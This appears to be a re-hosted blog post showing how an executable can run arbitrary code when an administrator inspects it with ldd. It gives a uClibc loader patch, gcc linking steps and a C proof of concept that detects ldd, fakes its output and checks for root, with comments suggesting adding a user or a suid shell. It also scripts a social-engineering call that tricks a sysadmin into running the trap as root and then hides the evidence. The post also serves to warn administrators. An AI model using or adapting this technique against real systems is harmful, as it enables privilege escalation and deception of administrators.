<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://catonmat.net/ldd-arbitrary-code-execution">Original</a>
    <h1>Never run ldd on unknown executables</h1>
    
    <div id="readability-page-1" class="page"><div>
                
    <p>The <code>ldd</code> utility is more vulnerable than you think. It&#39;s frequently used by programmers and system administrators to determine the dynamic library dependencies of executables. Sounds pretty innocent, right? Wrong!</p>
<p>In this article I am going to show you how to create an executable that runs arbitrary code if it&#39;s examined by <code>ldd</code>. I have also written a social engineering scenario on how you can get your sysadmin to unknowingly hand you his privileges.</p>
<p>I researched this subject thoroughly and found that it&#39;s almost completely undocumented. I have no idea how this could have gone unnoticed for such a long time. Here are the only few documents that mention this interesting behavior: <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">1</a>, <a href="http://www.mail-archive.com/debian-glibc@lists.debian.org/msg39907.html">2</a>, <a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=514408">3</a>, <a href="http://reverse.lostrealm.com/protect/ldd.html">4</a>.</p>
<p>First let&#39;s understand how <code>ldd</code> works. Take a look at these three examples:</p>
<pre html="">[1] $ &lt;strong&gt;ldd /bin/grep&lt;/strong&gt;
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7eca000)
        /lib/ld-linux.so.2 (0xb801e000)

[2] $ &lt;strong&gt;LD_TRACE_LOADED_OBJECTS=1 /bin/grep&lt;/strong&gt;
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)
        /lib/ld-linux.so.2 (0xb7f84000)

[3] $ &lt;strong&gt;LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep&lt;/strong&gt;
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7f7c000)
        /lib/ld-linux.so.2 (0xb80d0000)
</pre>
<p>The first command [1] runs <code>ldd</code> on <code>/bin/grep</code>. The output is what we expect -- a list of dynamic libraries that <code>/bin/grep</code> depends on.</p>
<p>The second command [2] sets the LD_TRACE_LOADED_OBJECTS environment variable and seemingly executes <code>/bin/grep</code> (but not quite). Surprisingly the output is the same!</p>
<p>The third command [3] again sets the LD_TRACE_LOADED_OBJECTS environment variable, calls the dynamic linker/loader <code>ld-linux.so</code> and passes <code>/bin/grep</code> to it as an argument. The output is again the same!</p>
<p><strong>What&#39;s going on here?</strong></p>
<p>It turns out that <code>ldd</code> is nothing more than a wrapper around the 2nd and 3rd command. In the 2nd and 3rd example <code>/bin/grep</code> was never run. That&#39;s a peculiarity of the GNU dynamic loader. If it notices the LD_TRACE_LOADED_OBJECTS environment variable, it never executes the program, it outputs the list of dynamic library dependencies and quits. (On BSD <code>ldd</code> is a C program that does the same.)</p>
<p>If you are on Linux, take a look at the <code>ldd</code> executable. You&#39;ll find that it&#39;s actually a bash script. If you step through it very carefully, you&#39;ll notice that the 2nd command gets executed if the program specified to <code>ldd</code> can&#39;t be loaded by the <code>ld-linux.so</code> loader, and that the 3rd command gets executed if it can.</p>
<p>One particular case when a program won&#39;t be handled by <code>ld-linux.so</code> is when it has a different loader than the system&#39;s default specified in it&#39;s .interp ELF section. That&#39;s the whole idea in executing arbitrary code with <code>ldd</code> -- load the executable via a different loader that does not handle LD_TRACE_LOADED_OBJECTS environment variable but instead executes the program.</p>
<p>For example, you can put a malicious executable in ~/app/bin/exec and have it loaded by ~/app/lib/loader.so. If someone does <code>ldd /home/you/app/bin/exec</code> then it&#39;s game over for them. They just ran the nasty code you had put in your executable. You can do some social engineering to get the sysadmin to execute <code>ldd</code> on your executable allowing you to gain the control over the box.</p>
<p><strong>Compiling the new loader.</strong></p>
<p>Get the <a href="http://www.uclibc.org/">uClibc</a> C library. It has pretty code and can be easily patched to bypass the LD_TRACE_LOADED_OBJECTS checks.</p>
<pre>$ mkdir app
$ cd app
app$ wget &#39;http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2&#39;
</pre>
<p>Unpack it and run <code>make menuconfig</code>, choose the target architecture (most likely i386), leave everything else unchanged.</p>
<pre>app$ bunzip2 &lt; uClibc-0.9.30.1.tar.bz2 | tar -vx
app$ rm -rf uClibc-0.9.30.1.tar.bz2
app$ cd uClibc-0.9.30.1
app/uClibc-0.9.30.1$ make menuconfig
</pre>
<p>Edit .config and set the destination install directory to <code>/home/you/app/uclibc</code>.</p>
<pre># change these two lines
RUNTIME_PREFIX=&#34;/usr/$(TARGET_ARCH)-linux-uclibc/&#34;
DEVEL_PREFIX=&#34;/usr/$(TARGET_ARCH)-linux-uclibc/usr/&#34;

# to this
RUNTIME_PREFIX=&#34;/home/you/app/uclibc/&#34;
DEVEL_PREFIX=&#34;/home/you/app/uclibc/usr/&#34;
</pre>
<p>Now we&#39;ll need to patch it to bypass LD_TRACE_LOADED_OBJECTS check.</p>
<p>Here is the patch. It patches the <code>ldso/ldso/ldso.c</code> file. Save the patch to a file and run <code>patch -p0 &lt; file</code>. If you don&#39;t do it, arbitrary code execution won&#39;t work, because it will think that <code>ldd</code> wants to list dependencies.</p>
<pre>--- ldso/ldso/ldso-orig.c       2009-10-25 00:27:12.000000000 +0300
+++ ldso/ldso/ldso.c    2009-10-25 00:27:22.000000000 +0300
@@ -404,9 +404,11 @@
        }
 #endif

+    /*
        if (_dl_getenv(&#34;LD_TRACE_LOADED_OBJECTS&#34;, envp) != NULL) {
                trace_loaded_objects++;
        }
+    */

 #ifndef __LDSO_LDD_SUPPORT__
        if (trace_loaded_objects) {
</pre>
<p>Now compile and install it.</p>
<pre>app/uClibc-0.9.30.1$ make -j 4
app/uClibc-0.9.30.1$ make install
</pre>
<p>This will install the uClibc loader and libc library to /home/you/app/uclibc.</p>
<p>That&#39;s it. We have now installed uClibc. All we have to do now is link our executable with uClibc&#39;s loader (app/lib/ld-uClibc.so.0). It will execute the code if run under <code>ldd</code>!</p>
<p><strong>Creating and linking an executable with uClibc&#39;s loader.</strong></p>
<p>First let&#39;s create a test application that will just print something when executed via <code>ldd</code> and let&#39;s put it in <code>app/bin/myapp</code></p>
<pre>app/uClibc-0.9.30.1$ cd ..
app$ mkdir bin
app$ cd bin
app/bin$ vim myapp.c
</pre>
<p>Let&#39;s write the following in <code>myapp.c</code>.</p>
<pre>#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main() {
  if (getenv(&amp;#34;LD_TRACE_LOADED_OBJECTS&amp;#34;)) {
    printf(&#34;All your box are belong to me.\n&#34;);
  }
  else {
    printf(&#34;Nothing.\n&#34;);
  }
  return 0;
}
</pre>
<p>This is the most basic code. It checks if LD_TRACE_LOADED_OBJECTS env variable is set or not. If the variable set, the program acts maliciously but if it&#39;s not, the program acts as if nothing happened.</p>
<p>The compilation is somewhat complicated because we have to link with the new C library statically (because anyone who might execute our program via <code>ldd</code> will not have our new C library in their LD_LIBRARY_PATH) and specify the new loader:</p>
<pre>app/bin$ L=/home/you/app/uclibc
app/bin$ gcc -Wl,&amp;#45;&amp;#45;dynamic-linker,$L/lib/ld-uClibc.so.0 \
    -Wl,-rpath-link,$L/lib \
    -nostdlib \
    myapp.c -o myapp \
    $L/usr/lib/crt*.o \
    -L$L/usr/lib/ \
    -lc
</pre>
<p>Here is the explanation of options passed to gcc:</p>
<ul>
    <li><strong>-Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0</strong> -- specifies the new loader,</li>
    <li><strong>-Wl,-rpath-link,$L/lib</strong> -- specifies the primary directory where the dynamic loader will look for dependencies,</li>
    <li><strong>-nostdlib</strong> -- don&#39;t use system libraries,</li>
    <li><strong>myapp.c -o myapp</strong> -- compile myapp.c to executable myapp,</li>
    <li><strong>$L/usr/lib/crt*.o</strong> -- statically link to initial runtime code, function prolog, epilog,</li>
    <li><strong>-L$L/usr/lib/</strong> -- search for libc in this directory,</li>
    <li><strong>-lc</strong> -- link with the C library.</li>
</ul>
<p>Now let&#39;s run the new <code>myapp</code> executable. First, without ldd:</p>
<pre>app/bin$ ./myapp 
Nothing.
</pre>
<p>LD_TRACE_LOADED_OBJECTS environment variable was not set and the program output &#34;Nothing.&#34; as expected.</p>
<p>Now let&#39;s run it via <code>ldd</code> and for the maximum effect, let&#39;s run it from the root shell, as if I was the sysadmin:</p>
<pre>app/bin$ su
Password: 
app/bin# ldd ./myapp
&lt;strong&gt;All your box are belong to me.&lt;/strong&gt;
</pre>
<p>Wow! The sysadmin just executed our exploit! He lost the system.</p>
<p><strong>A more sophisticated example.</strong></p>
<p>Here is a more sophisticated example that I just came up with. When run without <code>ldd</code> this application fails with a fictitious &#34;error while loading shared libraries&#34; error. When run under <code>ldd</code> it checks if the person is root, and owns the box. After that it fakes <code>ldd</code> output and pretends to have <code>libat.so.0</code> missing.</p>
<p>This code needs a lot of improvements and just illustrates the main ideas.</p>
<pre>#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

/*
This example pretends to have a fictitious library &amp;#39;libat.so.0&amp;#39; missing.
When someone with root permissions runs `ldd this_program`, it does
something nasty in malicious() function.

I haven&amp;#39;t implemented anything malicious but have written down some ideas
of what could be done.

This is, of course, a joke program. To make it look more real, you&amp;#39;d have
to bump its size, add some more dependencies, simulate trying to open the
missing library, detect if ran under debugger or strace and do absolutely
nothing suspicious, etc.
*/

void pretend_as_ldd()
{
    printf(&amp;#34;\tlinux-gate.so.1 =&amp;gt;  (0xffffe000)\n&amp;#34;);
    printf(&amp;#34;\tlibat.so.0 =&amp;gt; not found\n&amp;#34;);
    printf(&amp;#34;\tlibc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7ec3000)\n&amp;#34;);
    printf(&amp;#34;\t/lib/ld-linux.so.2 (0xb8017000)\n&amp;#34;);
}

void malicious()
{
    if (geteuid() == 0) {
        /* we are root ... */
        printf(&amp;#34;poof, all your box are belong to us\n&amp;#34;);

        /* silently add a new user to /etc/passwd, */
        /* or create a suid=0 program that you can later execute, */
        /* or do something really nasty */
    }
}

int main(int argc, char **argv)
{
    if (getenv(&amp;#34;LD_TRACE_LOADED_OBJECTS&amp;#34;)) {
        malicious();
        pretend_as_ldd();
        return 0;
    }

    printf(&amp;#34;%s: error while loading shared libraries: libat.so.0: &amp;#34;
           &amp;#34;cannot open shared object file: No such file or directory\n&amp;#34;,
           argv[0]);
    return 127;
}
</pre>
<p>Actually you can put the code you want to get executed right in the loader itself. This way the executable will always look clean.</p>
<p><strong>Social engineering.</strong></p>
<p>Most system administrators probably don&#39;t know that they should never run <code>ldd</code> on unfamiliar executables.</p>
<p>Here is a fake scenario on how to get your sysadmin run <code>ldd</code> on your executable.</p>
<p>Sysadmin&#39;s phone: <em>ring, ring</em>.</p>
<p>Sysadmin: &#34;Mr. sysadmin here. How can I help you?&#34;</p>
<p>You: &#34;Hi. An app that I have been using has started misbehaving. I am getting weird dependency errors. Could you see what is wrong?&#34;</p>
<p>Sysadmin: &#34;Sure. What app is it?&#34;</p>
<p>You: &#34;It&#39;s in my home directory, /home/carl/app/bin/myapp. Sometimes when I run it, it says something about &#39;error while loading shared libraries&#39;.&#34;</p>
<p>Sysadmin: &#34;Just a sec.&#34; <em>noise from keyboard in the background</em></p>
<p>Sysadmin: &#34;What was it again? It must be some kind of a library problem. I am going to check its dependencies.&#34;</p>
<p>You: &#34;Thanks, it&#39;s /home/carl/app/bin/myapp.&#34;</p>
<p>Sysadmin: &#34;Hmm. It says it&#39;s missing <code>libat.so.0</code>, ever heard of it?&#34;</p>
<p>You: &#34;Nope, no idea... I really need to get my work done, can you check on that and get back to me?&#34; <em>evil grin in the background</em></p>
<p>Sysadmin: &#34;Okay Carl, I&#39;m gonna call you back.&#34;</p>
<p>You: &#34;Thanks! See ya.&#34;</p>
<p>You: <code>mv ~/.hidden/working_app ~/app/bin/myapp</code>.</p>
<p><em>After a while.</em></p>
<p>Sysadmin calls: &#34;Hi. It seems to be working now. I don&#39;t know what the problem was.&#34;</p>
<p>You: &#34;Oh, okay. Thanks!&#34;</p>
<p><strong>Lesson to be learned: Never run <code>ldd</code> on unknown executables!</strong></p>
<p>P.S. If you enjoyed this article <a href="https://catonmat.net/feed">subscribe to my future posts</a>! I have many more quality articles coming.</p>

            </div></div>
  </body>
</html>
